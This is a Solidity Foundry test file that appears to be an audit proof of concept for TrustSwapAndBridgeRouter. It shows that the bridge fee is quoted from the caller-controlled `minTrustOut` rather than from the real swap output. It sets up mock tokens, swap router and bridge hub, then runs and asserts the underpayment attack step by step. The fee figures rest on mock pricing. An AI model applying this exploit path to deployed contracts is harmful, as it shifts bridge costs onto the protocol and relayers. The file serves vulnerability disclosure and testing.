// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import { BaseTest } from "./BaseTest.t.sol";
import { TrustSwapAndBridgeRouter } from "contracts/TrustSwapAndBridgeRouter.sol";
import { ISlipstreamSwapRouter } from "contracts/interfaces/external/aerodrome/ISlipstreamSwapRouter.sol";
import { FinalityState } from "contracts/interfaces/external/metalayer/IMetaERC20Hub.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Mock contracts used exclusively in this PoC
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC-20 mock with storage-based balances; also serves as an WETH stand-in
contract MockTokenPoC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function initialize(string memory, string memory, uint8) external { }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Satisfy SafeERC20.safeIncreaseAllowance
    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        allowance[msg.sender][spender] += addedValue;
        return true;
    }
}

/// @dev WETH mock that wraps ETH on deposit()
contract MockWETHPoC is MockTokenPoC {
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }
}

/// @dev Swap router mock: output = amountIn × OUTPUT_MULTIPLIER (no real pricing)
contract MockSwapRouterPoC {
    uint256 public immutable OUTPUT_MULTIPLIER;

    constructor(uint256 multiplier) {
        OUTPUT_MULTIPLIER = multiplier;
    }

    function exactInput(ISlipstreamSwapRouter.ExactInputParams calldata params)
        external
        returns (uint256 amountOut)
    {
        amountOut = params.amountIn * OUTPUT_MULTIPLIER;
        require(amountOut >= params.amountOutMinimum, "MockSwapRouterPoC: too little received");

        // Pull tokenIn and mint tokenOut at the recipient
        bytes calldata path = params.path;
        address tokenIn = address(bytes20(path[:20]));
        address tokenOut = address(bytes20(path[path.length - 20:]));

        MockTokenPoC(tokenIn).transferFrom(msg.sender, address(this), params.amountIn);
        MockTokenPoC(tokenOut).mint(params.recipient, amountOut);
    }
}

/// @dev Bridge-fee mock: fee = amount / FEE_DIVISOR (scales linearly with bridged amount)
contract MockMetaHubPoC {
    uint256 public constant FEE_DIVISOR = 1e9;

    uint256 public lastBridgedAmount;
    uint256 public lastBridgeFee;

    function quoteTransferRemote(uint32, bytes32, uint256 amount) external pure returns (uint256) {
        return amount / FEE_DIVISOR;
    }

    function transferRemote(
        uint32,
        bytes32,
        uint256 amount,
        uint256,
        FinalityState
    )
        external
        payable
        returns (bytes32 transferId)
    {
        lastBridgedAmount = amount;
        lastBridgeFee = msg.value;
        transferId = keccak256(abi.encodePacked(amount, msg.value, block.timestamp));
    }
}

/**
 * @title  PoCPeriphery
 * @notice Proof-of-Concept demonstrating a High-severity vulnerability in
 *         TrustSwapAndBridgeRouter.sol:
 *
 *         Vulnerability Title:
 *           Bridge Fee Quoted from Caller-Controlled `minTrustOut` Instead of Actual Swap Output
 *
 *         Risk Rating: High — Systematic underpayment of bridge fees; bridges can be
 *         permanently underfunded or relayers/protocol absorb the difference.
 *
 *         Description:
 *         Both `swapAndBridgeWithETH` and `swapAndBridgeWithERC20` call
 *         `metaERC20Hub.quoteTransferRemote(…, minTrustOut)` to determine the required bridge
 *         fee BEFORE the swap is executed.  The actual swap output `amountOut` can far exceed
 *         `minTrustOut` when slippage is favourable, but the router forwards only the pre-swap
 *         fee — which was computed for the much smaller `minTrustOut` — to the bridge hub when
 *         bridging the full `amountOut`.
 *
 *         Because `minTrustOut` is a caller-controlled slippage floor, any user can set it to
 *         an arbitrarily small value to minimise the quoted fee, then rely on normal market
 *         conditions to produce a far larger actual output, effectively paying near-zero bridge
 *         fees for an arbitrarily large cross-chain transfer.
 *
 *         Attack Path:
 *         1. Attacker calls `swapAndBridgeWithERC20(tokenIn, amountIn, path, minTrustOut=ε, …)`
 *            with a negligible `minTrustOut` (e.g. 1 wei).
 *         2. The router quotes the bridge fee for ε → fee ≈ 0.
 *         3. The swap executes and returns `amountOut >> ε`.
 *         4. The router bridges `amountOut` but forwards only the ~0 fee.
 *         5. If the bridge hub requires a fee proportional to the bridged amount the transaction
 *            may succeed (underfunded hub) or silently revert after the swap, burning the gas
 *            and locking the tokens in the router.
 *
 *         Impact:
 *         - Attacker bridges large TRUST amounts while paying negligible fees.
 *         - Protocol/relayers subsidise the shortfall.
 *         - If the bridge hub enforces the fee post-factum, the swap output is trapped in the
 *           router with no recovery path.
 *
 *         Root Cause:
 *         The fee is quoted using `minTrustOut` (the slippage minimum) rather than the actual
 *         post-swap `amountOut`.  The two values are decoupled: `minTrustOut` is chosen by the
 *         caller, while `amountOut` is determined by the market.
 */
contract PoCPeriphery is BaseTest {
    // Hardcoded Base mainnet token addresses used by TrustSwapAndBridgeRouter
    address internal constant BASE_USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant BASE_TRUST = 0x6cd905dF2Ed214b22e0d48FF17CD4200C1C6d8A3;
    address internal constant BASE_WETH = 0x4200000000000000000000000000000000000006;

    // The swap mock inflates output by 1e12×.
    // With amountIn = 1e6 (1 USDC at 6 decimals) this yields 1e18 TRUST (1 TRUST at 18 decimals),
    // simulating a very favorable swap rate to amplify the fee shortfall for the demonstration.
    uint256 internal constant OUTPUT_MULTIPLIER = 1e12;

    function test_submissionValidity() external {
        TrustSwapAndBridgeRouter router = new TrustSwapAndBridgeRouter();

        // ---------------------------------------------------------------
        // Deploy mocks and etch them at the router's hardcoded addresses
        // ---------------------------------------------------------------
        MockTokenPoC usdcImpl = new MockTokenPoC();
        MockTokenPoC trustImpl = new MockTokenPoC();
        MockWETHPoC wethImpl = new MockWETHPoC();
        MockSwapRouterPoC swapRouterImpl = new MockSwapRouterPoC(OUTPUT_MULTIPLIER);
        MockMetaHubPoC metaHubImpl = new MockMetaHubPoC();

        vm.etch(BASE_USDC, address(usdcImpl).code);
        vm.etch(BASE_TRUST, address(trustImpl).code);
        vm.etch(BASE_WETH, address(wethImpl).code);
        vm.etch(router.slipstreamSwapRouter(), address(swapRouterImpl).code);
        vm.etch(address(router.metaERC20Hub()), address(metaHubImpl).code);

        MockTokenPoC usdc = MockTokenPoC(BASE_USDC);
        MockMetaHubPoC metaHub = MockMetaHubPoC(address(router.metaERC20Hub()));

        // ---------------------------------------------------------------
        // Swap parameters
        // ---------------------------------------------------------------
        int24 tickSpacing = 100;
        bytes memory path = abi.encodePacked(BASE_USDC, tickSpacing, BASE_TRUST);

        uint256 amountIn = 1e6; // 1 USDC

        // expectedAmountOut = 1e6 * 1e12 = 1e18 (1 TRUST) from the mock multiplier
        uint256 expectedAmountOut = amountIn * OUTPUT_MULTIPLIER;

        // Attacker sets minTrustOut to a tiny value to minimise the quoted bridge fee
        uint256 minTrustOut = 1e12; // 0.000001 TRUST — far below expected output

        // ---------------------------------------------------------------
        // Calculate the fee discrepancy
        // ---------------------------------------------------------------
        bytes32 recipientAddr = bytes32(uint256(uint160(users.alice)));

        // Fee the attacker actually pays (quoted for the tiny minTrustOut)
        uint256 feePaidByAttacker =
            metaHub.quoteTransferRemote(router.recipientDomain(), recipientAddr, minTrustOut);

        // Fee that *should* be paid for the actual bridged amount
        uint256 feeThatShouldBePaid =
            metaHub.quoteTransferRemote(router.recipientDomain(), recipientAddr, expectedAmountOut);

        // ---------------------------------------------------------------
        // Execute the attack
        // ---------------------------------------------------------------
        usdc.mint(users.alice, 10_000e6);
        vm.prank(users.alice);
        usdc.approve(address(router), type(uint256).max);

        vm.deal(users.alice, feePaidByAttacker);

        vm.prank(users.alice);
        (uint256 amountOut,) =
            router.swapAndBridgeWithERC20{ value: feePaidByAttacker }(BASE_USDC, amountIn, path, minTrustOut, users.alice);

        // ---------------------------------------------------------------
        // Prove the vulnerability:
        // Full `amountOut` was bridged using only the fee for `minTrustOut`
        // ---------------------------------------------------------------
        assertEq(amountOut, expectedAmountOut, "Full swap output was bridged");
        assertEq(metaHub.lastBridgedAmount(), expectedAmountOut, "Bridge hub received the full amount");
        assertEq(metaHub.lastBridgeFee(), feePaidByAttacker, "Bridge hub received only the tiny fee");

        // The fee shortfall: attacker saves almost all of the required fee
        assertLt(
            feePaidByAttacker,
            feeThatShouldBePaid,
            "Fee paid < fee required — attacker underpaid the bridge"
        );

        // Quantify the savings:
        //   feePaidByAttacker   = minTrustOut  / FEE_DIVISOR = 1e12 / 1e9 = 1_000 wei
        //   feeThatShouldBePaid = amountOut    / FEE_DIVISOR = 1e18 / 1e9 = 1e9  wei (1 gwei)
        //   Shortfall           = 1e9 - 1_000 ≈ 999_999_000 wei per 1 USDC input
        assertEq(feePaidByAttacker, minTrustOut / metaHub.FEE_DIVISOR(), "Fee paid equals fee for minTrustOut");
        assertEq(
            feeThatShouldBePaid, expectedAmountOut / metaHub.FEE_DIVISOR(), "Correct fee equals fee for actual output"
        );
    }
}
